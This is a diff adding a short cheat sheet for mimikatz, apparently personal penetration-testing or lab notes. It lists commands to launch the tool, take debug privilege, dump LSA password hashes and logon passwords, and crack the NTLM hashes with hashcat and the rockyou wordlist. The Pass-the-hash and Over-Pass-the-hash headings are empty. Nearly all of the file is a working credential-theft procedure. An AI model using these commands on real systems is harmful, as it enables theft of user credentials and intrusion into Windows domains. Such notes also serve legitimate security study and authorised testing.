@@ -1,0 +1,23 @@
+mimikatz - post-exploitation tool most commonly used for dumping user credentials 
+inside of an active directory network
+Source: https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919 (unzip and transfer with python server)
+
+##################### Dumping hashes #####################
+Commands:
+  cd Downloads && mimikatz.exe
+                    Run mimikatz
+  privilege::debug
+                    Ensure that the output is "Privilege '20' ok" -
+  lsadump::lsa /patch
+                    Dump hashes
+  hashcat -m 1000 <HASH> rockyou.txt
+                  Crack hashes
+  sekurlsa:logonPasswords
+                  Scroll through and see what's available
+
+
+##################### Pass-the-hash #####################
+
+
+
+##################### Over-Pass-the-hash #####################
